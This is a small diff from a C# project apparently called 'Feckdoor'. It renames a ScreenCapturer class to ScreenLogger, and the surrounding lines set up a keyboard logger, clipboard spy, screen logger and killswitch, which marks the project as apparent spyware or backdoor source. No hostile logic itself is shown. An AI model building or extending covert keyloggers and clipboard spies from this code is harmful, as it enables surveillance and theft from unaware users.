@@ -14,7 +14,7 @@ namespace Feckdoor
 		private static KeyboardLogger InputLog = null!;
 		private static KillswitchHandler Killswitch = null!;
 		private static ClipboardSpy ClipSpy = null!;
-		private static ScreenCapturer ScreenCapture = null!;
+		private static ScreenLogger ScreenCapture = null!;
 
 		private static bool disposed = false;
 
@@ -71,7 +71,7 @@ namespace Feckdoor
 				InputLog = new KeyboardLogger();
 				Killswitch = new KillswitchHandler();
 				ClipSpy = new ClipboardSpy();
-				ScreenCapture = new ScreenCapturer();
+				ScreenCapture = new ScreenLogger();
 
 				Application.Run();
 			}
